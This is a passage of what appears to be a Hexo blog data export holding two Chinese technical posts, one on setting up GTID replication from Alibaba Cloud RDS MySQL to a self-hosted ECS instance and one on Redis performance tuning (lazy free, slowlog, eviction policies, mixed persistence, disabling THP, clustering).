for mysql与线下ECS上自建数据库数据实时同步，阿里云官方推荐使用DTS方式进行。原因有两个：</p>\n<ul>\n<li><p>mysql-bin正常情况下,RDS在本地只保存18个小时</p>\n</li>\n<li><p>当RDS实例切换时，会影响自建ECS数据同步(这个经过测试可以排除)</p>\n</li>\n</ul>\n<p>考虑到使用DTS工具会产生不少的费用(长期使用)，另一方面，在数据库中一个地区对应一个库，后续业务无法事先规划好库名，此时如果使用dts可能需要购买多个通道，进行配置，比较费时费力且费钱。基于这两个原因的考虑，决定使用搭建主从复制方式来实现数据同步</p>","more":"<h3 id=\"基础概念\"><a href=\"#基础概念\" class=\"headerlink\" title=\"基础概念\"></a>基础概念</h3><p>传统的MYSQL主从就是主库每做一个操作会在binlog上做一个position，每做一个event就在binlog做一个起始编号、一个终止编号。然后主库把binlog传递给从库，然后从库根据这个binlog的pos值就按照顺序做一样的操作，达到两个数据库保持一致的目的。</p>\n<p>GTID不用这个position的方式，而是用了全局事物标识，这个标识的格式是<code>source_id:transaction_id</code>，如<code>3E11FA47-71CA-11E1-9E33-C80AA9429562:23</code></p>\n<ul>\n<li><p>source_id即是server_uuid，在第一次启动时生成(函数 generate_server_uuid)，并持久化到DATADIR/auto.cnf文件里</p>\n</li>\n<li><p>transaction_id是顺序化的序列号(sequence number)，在每台 MySQL 服务器上都是从 1 开始自增长的序列，是事务的唯一标识</p>\n</li>\n</ul>\n<p>它的主从过程是这样的：主库更新数据时，会在事务前产生GTID，连通sql记录到binlog日志中。从库的i/o线程将变更的binlog写入到relay log中，读取值是根据gitd_next变量，告诉从库下一个执行哪个GTID。从库的sql线程从relay log中获取GTID，然后对比从库的的binlog是否有记录。如果有记录，说明该GTID的事务已经执行，从库会忽略。如果没有记录，从库就会从relay log中执行该GTID的事务，并记录到从库binlog。在解析过程中会判断是否有主键，如果没有就用二级索引，如果没有二级索引就用全部扫描。</p>\n<p>也就是说，无论是级联情况，还是一主多从情况，都可以通过GTID自动找点儿，而无需像之前那样通过binlog和binlog_position找点儿了</p>\n<h3 id=\"RDS数据库配置\"><a href=\"#RDS数据库配置\" class=\"headerlink\" title=\"RDS数据库配置\"></a>RDS数据库配置</h3><ul>\n<li>配置从实例读取数据使用的只读账号和授权数据库</li>\n<li>将ECS的从实例的 IP 地址加入主实例的 IP 白名单中</li>\n<li>登录主实例</li>\n</ul>\n<h4 id=\"查询-server-id\"><a href=\"#查询-server-id\" class=\"headerlink\" title=\"查询 server-id\"></a>查询 server-id</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like &apos;server_id&apos;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"查询-GTID\"><a href=\"#查询-GTID\" class=\"headerlink\" title=\"查询 GTID\"></a>查询 GTID</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show global variables like &apos;gtid_purged&apos;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ECS数据库配置\"><a href=\"#ECS数据库配置\" class=\"headerlink\" title=\"ECS数据库配置\"></a>ECS数据库配置</h3><h4 id=\"mysql文件配置\"><a href=\"#mysql文件配置\" class=\"headerlink\" title=\"mysql文件配置\"></a>mysql文件配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server-id = 1001 #不可与RDS主库id相同</span><br><span class=\"line\">port = 3306</span><br><span class=\"line\">replicate-do-db = masterdb #需要同步的数据库</span><br><span class=\"line\"></span><br><span class=\"line\">binlog_format = row #日志文件格式</span><br><span class=\"line\">log-bin = mysql-bin</span><br><span class=\"line\">log-bin-index = mysql-bin.index</span><br><span class=\"line\">relay-log = relay-log</span><br><span class=\"line\">relay_log_index = relay-log.index</span><br><span class=\"line\">slave-skip-errors = all</span><br></pre></td></tr></table></figure>\n<h4 id=\"GTID配置\"><a href=\"#GTID配置\" class=\"headerlink\" title=\"GTID配置\"></a>GTID配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gtid_mode = on</span><br><span class=\"line\">enforce_gtid_consistency = on</span><br><span class=\"line\">log-slave-updates = 1</span><br><span class=\"line\"></span><br><span class=\"line\">sql_mode = NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br></pre></td></tr></table></figure>\n<h4 id=\"从库配置\"><a href=\"#从库配置\" class=\"headerlink\" title=\"从库配置\"></a>从库配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave;</span><br><span class=\"line\">mysql&gt; set global gtid_purged = &apos;533ac4e6-9565-11e8-abb5-7cd30abca02e:1-3099396&apos;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>注意：设置gtid_purged值时，gtid_executed值必须为空否则报错，该值清空的方法就是reset  master命令</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt;reset master;</span><br></pre></td></tr></table></figure>\n<h4 id=\"执行同步\"><a href=\"#执行同步\" class=\"headerlink\" title=\"执行同步\"></a>执行同步</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CHANGE MASTER TO</span><br><span class=\"line\">MASTER_HOST=&apos;xxxxxxx.mysql.rds.aliyuncs.com&apos;,</span><br><span class=\"line\">MASTER_PORT=3306,</span><br><span class=\"line\">MASTER_USER=&apos;username&apos;,</span><br><span class=\"line\">MASTER_PASSWORD=&apos;password&apos;,</span><br><span class=\"line\">master_auto_position=1;</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;start slave;</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看从库状态\"><a href=\"#查看从库状态\" class=\"headerlink\" title=\"查看从库状态\"></a>查看从库状态</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt;show slave status\\G;</span><br></pre></td></tr></table></figure>\n<p>两个yes表示成功</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Slave_IO_Running: Yes</span><br><span class=\"line\">Slave_SQL_Running: Yes</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"Redis性能优化整理","abbrlink":33866,"_content":"\n### 前言\n\nRedis 是基于单线程模型实现的，也就是 Redis 是使用一个线程来处理所有的客户端请求的，尽管 Redis 使用了非阻塞式 IO，并且对各种命令都做了优化（大部分命令操作时间复杂度都是 O(1)），但由于 Redis 是单线程执行的特点，因此它对性能的要求更加苛刻。\n\n<!--more-->\n\n### 开启 lazy free 特性\n\nlazy free 特性是 Redis 4.0 新增的一个非常使用的功能，它可以理解为惰性删除或延迟删除。意思是在删除的时候提供异步延时释放键值的功能，把键值释放操作放在 BIO(Background I/O) 单独的子线程处理中，以减少删除删除对 Redis 主线程的阻塞，可以有效地避免删除 big key 时带来的性能和可用性问题。\n\n```xml\nlazyfree-lazy-eviction no\nlazyfree-lazy-expire no\nlazyfree-lazy-server-del no\nslave-lazy-flush no\n```\n\n- lazyfree-lazy-eviction：表示当 Redis 运行内存超过 maxmeory 时，是否开启 lazy free 机制删除；\n- lazyfree-lazy-expire：表示设置了过期时间的键值，当过期之后是否开启 lazy free 机制删除；\n- lazyfree-lazy-server-del：有些指令在处理已存在的键时，会带有一个隐式的 del 键的操作，比如 rename 命令，当目标键已存在，Redis 会先删除目标键，如果这些目标键是一个 big key，就会造成阻塞删除的问题，此配置表示在这种场景中是否开启 lazy free 机制删除；\n- slave-lazy-flush：针对 slave(从节点) 进行全量数据同步，slave 在加载 master 的 RDB 文件前，会运行 flushall 来清理自己的数据，它表示此时是否开启 lazy free 机制删除。\n\n开启其中的 lazyfree-lazy-eviction、lazyfree-lazy-expire、lazyfree-lazy-server-del 等配置，这样就可以有效的提高主线程的执行效率。\n\n\n### 使用 slowlog 优化耗时命令\n\n可以使用 slowlog 功能找出最耗时的 Redis 命令进行相关的优化，以提升 Redis 的运行速度，慢查询有两个重要的配置项：\n\n- slowlog-log-slower-than ：用于设置慢查询的评定时间，也就是说超过此配置项的命令，将会被当成慢操作记录在慢查询日志中，它执行单位是微秒 (1 秒等于 1000000 微秒)；\n- slowlog-max-len ：用来配置慢查询日志的最大记录数。\n\n可以根据实际的业务情况进行相应的配置，其中慢日志是按照插入的顺序倒序存入慢查询日志中，可以使用 slowlog get n 来获取相关的慢查询日志，再找到这些慢查询对应的业务进行相关的优化。\n\n\n### 使用 Pipeline 批量操作数据\n\nPipeline (管道技术) 是客户端提供的一种批处理技术，用于一次处理多个 Redis 命令，从而提高整个交互的性能。\n\n\n### 避免大量数据同时失效\n\nRedis 过期键值删除使用的是贪心策略，它每秒会进行 10 次过期扫描，此配置可在 redis.conf 进行配置，默认值是 hz 10，Redis 会随机抽取 20 个值，删除这 20 个键中过期的键，如果过期 key 的比例超过 25% ，重复执行此流程。\n\n如果在大型系统中有大量缓存在同一时间同时过期，那么会导致 Redis 循环多次持续扫描删除过期字典，直到过期字典中过期键值被删除的比较稀疏为止，而在整个执行过程会导致 Redis 的读写出现明显的卡顿，卡顿的另一种原因是内存管理器需要频繁回收内存页，因此也会消耗一定的 CPU。\n为了避免这种卡顿现象的产生，我们需要预防大量的缓存在同一时刻一起过期，就简单的解决方案就是在过期时间的基础上添加一个指定范围的随机数。\n\n### 连接池\n\n尽量使用 Redis 连接池，而不是频繁创建销毁 Redis 连接，这样就可以减少网络传输次数和减少了非必要调用指令。\n\n\n### 限制 Redis 内存大小\n\n在 64 位操作系统中 Redis 的内存大小是没有限制的，也就是配置项 `maxmemory <bytes>` 是被注释掉的，这样就会导致在物理内存不足时，使用 swap 空间既交换空间，而当操心系统将 Redis 所用的内存分页移至 swap 空间时，将会阻塞 Redis 进程，导致 Redis 出现延迟，从而影响 Redis 的整体性能。\n\n因此需要限制 Redis 的内存大小为一个固定的值，当 Redis 的运行到达此值时会触发内存淘汰策略，内存淘汰策略在 Redis 4.0 之后有 8 种：\n\n- noeviction：不淘汰任何数据，当内存不足时，新增操作会报错，Redis 默认内存淘汰策略；\n- allkeys-lru：淘汰整个键值中最久未使用的键值；\n- allkeys-random：随机淘汰任意键值;\n- volatile-lru：淘汰所有设置了过期时间的键值中最久未使用的键值；\n- volatile-random：随机淘汰设置了过期时间的任意键值；\n- volatile-ttl：优先淘汰更早过期的键值。\n\n在 Redis 4.0 版本中又新增了 2 种淘汰策略：\n\n- volatile-lfu：淘汰所有设置了过期时间的键值中，最少使用的键值；\n- allkeys-lfu：淘汰整个键值中最少使用的键值。\n\n其中 allkeys-xxx 表示从所有的键值中淘汰数据，而 volatile-xxx 表示从设置了过期键的键值中淘汰数据。\n可以根据实际的业务情况进行设置，默认的淘汰策略不淘汰任何数据，在新增时会报错。\n\n\n### 混合持久化\n\nRedis 的持久化策略是将内存数据复制到硬盘上，这样才可以进行容灾恢复或者数据迁移，但维护此持久化的功能，需要很大的性能开销。\n在 Redis 4.0 之后，Redis 有 3 种持久化的方式：\n\n- RDB（Redis DataBase，快照方式）将某一个时刻的内存数据，以二进制的方式写入磁盘；\n- AOF（Append Only File，文件追加方式），记录所有的操作命令，并以文本的形式追加到文件中；\n- 混合持久化方式，Redis 4.0 之后新增的方式，混合持久化是结合了 RDB 和 AOF 的优点，在写入的时候，先把当前的数据以 RDB 的形式写入文件的开头，再将后续的操作命令以 AOF 的格式存入文件，这样既能保证 Redis 重启时的速度，又能减低数据丢失的风险。\n\nRDB 和 AOF 持久化各有利弊，RDB 可能会导致一定时间内的数据丢失，而 AOF 由于文件较大则会影响 Redis 的启动速度，为了能同时拥有 RDB 和 AOF 的优点，Redis 4.0 之后新增了混合持久化的方式，因此我们在必须要进行持久化操作时，应该选择混合持久化的方式。\n查询是否开启混合持久化可以使用 `config get aof-use-rdb-preamble` 命令\n\n### 禁用 THP 特性\n\nLinux kernel 在 2.6.38 内核增加了 Transparent Huge Pages (THP) 特性 ，支持大内存页 2MB 分配，默认开启。\n当开启了 THP 时，fork 的速度会变慢，fork 之后每个内存页从原来 4KB 变为 2MB，会大幅增加重写期间父进程内存消耗。同时每次写命令引起的复制内存页单位放大了 512 倍，会拖慢写操作的执行时间，导致大量写操作慢查询。例如简单的 incr 命令也会出现在慢查询中，因此 Redis 建议将此特性进行禁用，禁用方法如下：\n\n```bash\necho never >  /sys/kernel/mm/transparent_hugepage/enabled\n```\n\n\n为了使机器重启后 THP 配置依然生效，可以在 `/etc/rc.local` 中追加 `echo never > /sys/kernel/mm/transparent_hugepage/enabled`。\n\n### 使用分布式架构\n\nRedis 分布式架构有三个重要的手段：\n\n- 主从同步\n- 哨兵模式\n- Redis Cluster 集群\n\n使用主从同步功能我们可以把写入放到主库上执行，把读功能转移到从服务上，因此就可以在单位时间内处理更多的请求，从而提升的 Redis 整体的运行速度。\n\n而哨兵模式是对于主从功能的升级，但当主节点奔溃之后，无需人工干预就能自动恢复 Redis 的正常使用。\n\nRedis Cluster 是 Redis 3.0 正式推出的，Redis 集群是通过将数据库分散存储到多个节点上来平衡各个节点的负载压力。\n\nRedis Cluster 采用虚拟哈希槽分区，所有的键根据哈希函数映射到 0 ~ 16383 整数槽内，计算公式：slot = CRC16(key) & 16383，每一个节点负责维护一部分槽以及槽所映射的键值数据。这样 Redis 就可以把读写压力从一台服务器，分散给多台服务器了，因此性能会有很大的提升。\n\n在这三个功能中，只需要使用一个就行了，毫无疑问 Redis Cluster 应该是首选的实现方案，它可以把读写压力自动的分担给更多的服务器，并且拥有自动容灾的能力。","source":"_posts/2020/3/Redis性能优化整理.md","raw":"---\nlayout: post\ntitle: Redis性能优化整理\ntags:\n  - redis\ncategories:\n  - redis\nabbrlink: 33866\n---\n\n### 前言\n\nRedis 是基于单线程模型实现的，也就是 Redis 是使用一个线程来处理所有的客户端请求的，尽管 Redis 使用了非阻塞式 IO，并且对各种命令都做了优化（大部分命令操作时间复杂度都是 O(1)），但由于 Redis 是单线程执行的特点，因此它对性能的要求更加苛刻。\n\n<!--more-->\n\n### 开启 lazy free 特性\n\nlazy free 特性是 Redis 4.0 新增的一个非常使用的功能，它可以理解为惰性删除或延迟删除。意思是在删除的时候提供异步延时释放键值的功能，把键值释放操作放在 BIO(Background I/O) 单独的子线程处理中，以减少删除删除对 Redis 主线程的阻塞，可以有效地避免删除 big key 时带来的性能和可用性问题。\n\n```xml\nlazyfree-lazy-eviction no\nlazyfree-lazy-expire no\nlazyfree-lazy-server-del no\nslave-lazy-flush no\n```\n\n- lazyfree-lazy-eviction：表示当 Redis 运行内存超过 maxmeory 时，是否开启 lazy free 机制删除；\n- lazyfree-lazy-expire：表示设置了过期时间的键值，当过期之后是否开启 lazy free 机制删除；\n- lazyfree-lazy-server-del：有些指令在处理已存在的键时，会带有一个隐式的 del 键的操作，比如 rename 命令，当目标键已存在，Redis 会先删除目标键，如果这些目标键是一个 big key，就会造成阻塞删除的问题，此配置表示在这种场景中是否开启 lazy free 机制删除；\n- slave-lazy-flush：针对 slave(从节点) 进行全量数据同步，slave 在加载 master 的 RDB 文件前，会运行 flushall 来清理自己的数据，它表示此时是否开启 lazy free 机制删除。\n\n开启其中的 lazyfree-lazy-eviction、lazyfree-lazy-expire、lazyfree-lazy-server-del 等配置，这样就可以有效的提高主线程的执行效率。\n\n\n### 使用 slowlog 优化耗时命令\n\n可以使用 slowlog 功能找出最耗时的 Redis 命令进行相关的优化，以提升 Redis 的运行速度，慢查询有两个重要的配置项：\n\n- slowlog-log-slower-than ：用于设置慢查询的评定时间，也就是说超过此配置项的命令，将会被当成慢操作记录在慢查询日志中，它执行单位是微秒 (1 秒等于 1000000 微秒)；\n- slowlog-max-len ：用来配置慢查询日志的最大记录数。\n\n可以根据实际的业务情况进行相应的配置，其中慢日志是按照插入的顺序倒序存入慢查询日志中，可以使用 slowlog get n 来获取相关的慢查询日志，再找到这些慢查询对应的业务进行相关的优化。\n\n\n### 使用 Pipeline 批量操作数据\n\nPipeline (管道技术) 是客户端提供的一种批处理技术，用于一次处理多个 Redis 命令，从而提高整个交互的性能。\n\n\n### 避免大量数据同时失效\n\nRedis 过期键值删除使用的是贪心策略，它每秒会进行 10 次过期扫描，此配置可在 redis.conf 进行配置，默认值是 hz 10，Redis 会随机抽取 20 个值，删除这 20 个键中过期的键，如果过期 key 的比例超过 25% ，重复执行此流程。\n\n如果在大型系统中有大量缓存在同一时间同时过期，那么会导致 Redis 循环多次持续扫描删除过期字典，直到过期字典中过期键值被删除的比较稀疏为止，而在整个执行过程会导致 Redis 的读写出现明显的卡顿，卡顿的另一种原因是内存管理器需要频繁回收内存页，因此也会消耗一定的 CPU。\n为了避免这种卡顿现象的产生，我们需要预防大量的缓存在同一时刻一起过期，就简单的解决方案就是在过期时间的基础上添加一个指定范围的随机数。\n\n### 连接池\n\n尽量使用 Redis 连接池，而不是频繁创建销毁 Redis 连接，这样就可以减少网络传输次数和减少了非必要调用指令。\n\n\n### 限制 Redis 内存大小\n\n在 64 位操作系统中 Redis 的内存大小是没有限制的，也就是配置项 `maxmemory <bytes>` 是被注释掉的，这样就会导致在物理内存不足时，使用 swap 空间既交换空间，而当操心系统将 Redis 所用的内存分页移至 swap 空间时，将会阻塞 Redis 进程，导致 Redis 出现延迟，从而影响 Redis 的整体性能。\n\n因此需要限制 Redis 的内存大小为一个固定的值，当 Redis 的运行到达此值时会触发内存淘汰策略，内存淘汰策略在 Redis 4.0 之后有 8 种：\n\n- noeviction：不淘汰任何数据，当内存不足时，新增操作会报错，Redis 默认内存淘汰策略；\n- allkeys-lru：淘汰整个键值中最久未使用的键值；\n- allkeys-random：随机淘汰任意键值;\n- volatile-lru：淘汰所有设置了过期时间的键值中最久未使用的键值；\n- volatile-random：随机淘汰设置了过期时间的任意键值；\n- volatile-ttl：优先淘汰更早过期的键值。\n\n在 Redis 4.0 版本中又新增了 2 种淘汰策略：\n\n- volatile-lfu：淘汰所有设置了过期时间的键值中，最少使用的键值；\n- allkeys-lfu：淘汰整个键值中最少使用的键值。\n\n其中 allkeys-xxx 表示从所有的键值中淘汰数据，而 volatile-xxx 表示从设置了过期键的键值中淘汰数据。\n可以根据实际的业务情况进行设置，默认的淘汰策略不淘汰任何数据，在新增时会报错。\n\n\n### 混合持久化\n\nRedis 的持久化策略是将内存数据复制到硬盘上，这样才可以进行容灾恢复或者数据迁移，但维护此持久化的功能，需要很大的性能开销。\n在 Redis 4.0 之后，Redis 有 3 种持久化的方式：\n\n- RDB（Redis DataBase，快照方式）将某一个时刻的内存数据，以二进制的方式写入磁盘；\n- AOF（Append Only File，文件追加方式），记录所有的操作命令，并以文本的形式追加到文件中；\n- 混合持久化方式，Redis 4.0 之后新增的方式，混合持久化是结合了 RDB 和 AOF 的优点，在写入的时候，先把当前的数据以 RDB 的形式写入文件的开头，再将后续的操作命令以 AOF 的格式存入文件，这样既能保证 Redis 重启时的速度，又能减低数据丢失的风险。\n\nRDB 和 AOF 持久化各有利弊，RDB 可能会导致一定时间内的数据丢失，而 AOF 由于文件较大则会影响 Redis 的启动速度，为了能同时拥有 RDB 和 AOF 的优点，Redis 4.0 之后新增了混合持久化的方式，因此我们在必须要进行持久化操作时，应该选择混合持久化的方式。\n查询是否开启混合持久化可以使用 `config get aof-use-rdb-preamble` 命令\n\n### 禁用 THP 特性\n\nLinux kernel 在 2.6.38 内核增加了 Transparent Huge Pages (THP) 特性 ，支持大内存页 2MB 分配，默认开启。\n当开启了 THP 时，fork 的速度会变慢，fork 之后每个内存页从原来 4KB 变为 2MB，会大幅增加重写期间父进程内存消耗。同时每次写命令引起的复制内存页单位放大了 512 倍，会拖慢写操作的执行时间，导致大量写操作慢查询。例如简单的 incr 命令也会出现在慢查询中，因此 Redis 建议将此特性进行禁用，禁用方法如下：\n\n```bash\necho never >  /sys/kernel/mm/transparent_hugepage/enabled\n```\n\n\n为了使机器重启后 THP 配置依然生效，可以在 `/etc/rc.local` 中追加 `echo never > /sys/kernel/mm/transparent_hugepage/enabled`。\n\n### 使用分布式架构\n\nRedis 分布式架构有三个重要的手段：\n\n- 主从同步\n- 哨兵模式\n- Redis Cluster 集群\n\n使用主从同步功能我们可以把写入放到主库上执行，把读功能转移到从服务上，因此就可以在单位时间内处理更多的请求，从而提升的 Redis 整体的运行速度。\n\n而哨兵模式是对于主从功能的升级，但当主节点奔溃之后，无需人工干预就能自动恢复 Redis 的正常使用。\n\nRedis Cluster 是 Redis 3.0 正式推出的，Redis 集群是通过将数据库分散存储到多个节点上来平衡各个节点的负载压力。\n\nRedis Cluster 采用虚拟哈希槽分区，所有的键根据哈希函数映射到 0 ~ 16383 整数槽内，计算公式：slot = CRC16(key) & 16383，每一个节点负责维护一部分槽以及槽所映射的键值数据。这样 Redis 就可以把读写压力从一台服务器，分散给多台服务器了，因此性能会有很大的提升。\n\n在这三个功能中，只需要使用一个就行了，毫无疑问 Redis Cluster 应该是首选的实现方案，它可以把读写压力自动的分担给更多的服务器，并且拥有自动容灾的能力。","slug":"2020/3/Redis性能优化整理","published":1,"date":"2020-03-25T08:31:23.076Z","updated":"2020-04-12T06:34:43.631Z","comments":1,"photos":[],"link":"","_id":"ck9z76w04002l44vqr6uxmbxj","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Redis 是基于单线程模型实现的，也就是 Redis 是使用一个线程来处理所有的客户端请求的，尽管 Redis 使用了非阻塞式 IO，并且对各种命令都做了优化（大部分命令操作时间复杂度都是 O(1)），但由于 Redis 是单线程执行的特点，因此它对性能的要求更加苛刻。</p>\n<a id=\"more\"></a>\n<h3 id=\"开启-lazy-free-特性\"><a href=\"#开启-lazy-free-特性\" class=\"headerlink\" title=\"开启 lazy free 特性\"></a>开启 lazy free 特性</h3><p>lazy free 特性是 Redis 4.0 新增的一个非常使用的功能，它可以理解为惰性删除或延迟删除。意思是在删除的时候提供异步延时释放键值的功能，把键值释放操作放在 BIO(Background I/O) 单独的子线程处理中，以减少删除删除对 Redis 主线程的阻塞，可以有效地避免删除 big key 时带来的性能和可用性问题。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lazyfree-lazy-eviction no</span><br><span class=\"line\">lazyfree-lazy-expire no</span><br><span class=\"line\">lazyfree-lazy-server-del no</span><br><span class=\"line\">slave-lazy-flush no</span><br></pre></td></tr></table></figure>\n<ul>\n<li>lazyfree-lazy-eviction：表示当 Redis 运行内存超过 maxmeory 时，是否开启 lazy free 机制删除；</li>\n<li>lazyfree-lazy-expire：表示设置了过期时间的键值，当过期之后是否开启 lazy free 机制删除；</li>\n<li>lazyfree-lazy-server-del：有些指令在处理已存在的键时，会带有一个隐式的 del 键的操作，比如 rename 命令，当目标键已存在，Redis 会先删除目标键，如果这些目标键是一个 big key，就会造成阻塞删除的问题，此配置表示在这种场景中是否开启 lazy free 机制删除；</li>\n<li>slave-lazy-flush：针对 slave(从节点) 进行全量数据同步，slave 在加载 master 的 RDB 文件前，会运行 flushall 来清理自己的数据，它表示此时是否开启 lazy free 机制删除。</li>\n</ul>\n<p>开启其中的 lazyfree-lazy-eviction、lazyfree-lazy-expire、lazyfree-lazy-server-del 等配置，这样就可以有效的提高主线程的执行效率。</p>\n<h3 id=\"使用-slowlog-优化耗时命令\"><a href=\"#使用-slowlog-优化耗时命令\" class=\"headerlink\" title=\"使用 slowlog 优化耗时命令\"></a>使用 slowlog 优化耗时命令</h3><p>可以使用 slowlog 功能找出最耗时的 Redis 命令进行相关的优化，以提升 Redis 的运行速度，慢查询有两个重要的配置项：</p>\n<ul>\n<li>slowlog-log-slower-than ：用于设置慢查询的评定时间，也就是说超过此配置项的命令，将会被当成慢操作记录在慢查询日志中，它执行单位是微秒 (1 秒等于 1000000 微秒)；</li>\n<li>slowlog-max-len ：用来配置慢查询日志的最大记录数。</li>\n</ul>\n<p>可以根据实际的业务情况进行相应的配置，其中慢日志是按照插入的顺序倒序存入慢查询日志中，可以使用 slowlog get n 来获取相关的慢查询日志，再找到这些慢查询对应的业务进行相关的优化。</p>\n<h3 id=\"使用-Pipeline-批量操作数据\"><a href=\"#使用-Pipeline-批量操作数据\" class=\"headerlink\" title=\"使用 Pipeline 批量操作数据\"></a>使用 Pipeline 批量操作数据</h3><p>Pipeline (管道技术) 是客户端提供的一种批处理技术，用于一次处理多个 Redis 命令，从而提高整个交互的性能。</p>\n<h3 id=\"避免大量数据同时失效\"><a href=\"#避免大量数据同时失效\" class=\"headerlink\" title=\"避免大量数据同时失效\"></a>避免大量数据同时失效</h3><p>Redis 过期键值删除使用的是贪心策略，它每秒会进行 10 次过期扫描，此配置可在 redis.conf 进行配置，默认值是 hz 10，Redis 会随机抽取 20 个值，删除这 20 个键中过期的键，如果过期 key 的比例超过 25% ，重复执行此流程。</p>\n<p>如果在大型系统中有大量缓存在同一时间同时过期，那么会导致 Redis 循环多次持续扫描删除过期字典，直到过期字典中过期键值被删除的比较稀疏为止，而在整个执行过程会导致 Redis 的读写出现明显的卡顿，卡顿的另一种原因是内存管理器需要频繁回收内存页，因此也会消耗一定的 CPU。<br>为了避免这种卡顿现象的产生，我们需要预防大量的缓存在同一时刻一起过期，就简单的解决方案就是在过期时间的基础上添加一个指定范围的随机数。</p>\n<h3 id=\"连接池\"><a href=\"#连接池\" class=\"headerlink\" title=\"连接池\"></a>连接池</h3><p>尽量使用 Redis 连接池，而不是频繁创建销毁 Redis 连接，这样就可以减少网络传输次数和减少了非必要调用指令。</p>\n<h3 id=\"限制-Redis-内存大小\"><a href=\"#限制-Redis-内存大小\" class=\"headerlink\" title=\"限制 Redis 内存大小\"></a>限制 Redis 内存大小</h3><p>在 64 位操作系统中 Redis 的内存大小是没有限制的，也就是配置项 <code>maxmemory &lt;bytes&gt;</code> 是被注释掉的，这样就会导致在物理内存不足时，使用 swap 空间既交换空间，而当操心系统将 Redis 所用的内存分页移至 swap 空间时，将会阻塞 Redis 进程，导致 Redis 出现延迟，从而影响 Redis 的整体性能。</p>\n<p>因此需要限制 Redis 的内存大小为一个固定的值，当 Redis 的运行到达此值时会触发内存淘汰策略，内存淘汰策略在 Redis 4.0 之后有 8 种：</p>\n<ul>\n<li>noeviction：不淘汰任何数据，当内存不足时，新增操作会报错，Redis 默认内存淘汰策略；</li>\n<li>allkeys-lru：淘汰整个键值中最久未使用的键值；</li>\n<li>allkeys-random：随机淘汰任意键值;</li>\n<li>volatile-lru：淘汰所有设置了过期时间的键值中最久未使用的键值；</li>\n<li>volatile-random：随机淘汰设置了过期时间的任意键值；</li>\n<li>volatile-ttl：优先淘汰更早过期的键值。</li>\n</ul>\n<p>在 Redis 4.0 版本中又新增了 2 种淘汰策略：</p>\n<ul>\n<li>volatile-lfu：淘汰所有设置了过期时间的键值中，最少使用的键值；</li>\n<li>allkeys-lfu：淘汰整个键值中最少使用的键值。</li>\n</ul>\n<p>其中 allkeys-xxx 表示从所有的键值中淘汰数据，而 volatile-xxx 表示从设置了过期键的键值中淘汰数据。<br>可以根据实际的业务情况进行设置，默认的淘汰策略不淘汰任何数据，在新增时会报错。</p>\n<h3 id=\"混合持久化\"><a href=\"#混合持久化\" class=\"headerlink\" title=\"混合持久化\"></a>混合持久化</h3><p>Redis 的持久化策略是将内存数据复制到硬盘上，这样才可以进行容灾恢复或者数据迁移，但维护此持久化的功能，需要很大的性能开销。<br>在 Redis 4.0 之后，Redis 有 3 种持久化的方式：</p>\n<ul>\n<li>RDB（Redis DataBase，快照方式）将某一个时刻的内存数据，以二进制的方式写入磁盘；</li>\n<li>AOF（Append Only File，文件追加方式），记录所有的操作命令，并以文本的形式追加到文件中；</li>\n<li>混合持久化方式，Redis 4.0 之后新增的方式，混合持久化是结合了 RDB 和 AOF 的优点，在写入的时候，先把当前的数据以 RDB 的形式写入文件的开头，再将后续的操作命令以 AOF 的格式存入文件，这样既能保证 Redis 重启时的速度，又能减低数据丢失的风险。</li>\n</ul>\n<p>RDB 和 AOF 持久化各有利弊，RDB 可能会导致一定时间内的数据丢失，而 AOF 由于文件较大则会影响 Redis 的启动速度，为了能同时拥有 RDB 和 AOF 的优点，Redis 4.0 之后新增了混合持久化的方式，因此我们在必须要进行持久化操作时，应该选择混合持久化的方式。<br>查询是否开启混合持久化可以使用 <code>config get aof-use-rdb-preamble</code> 命令</p>\n<h3 id=\"禁用-THP-特性\"><a href=\"#禁用-THP-特性\" class=\"headerlink\" title=\"禁用 THP 特性\"></a>禁用 THP 特性</h3><p>Linux kernel 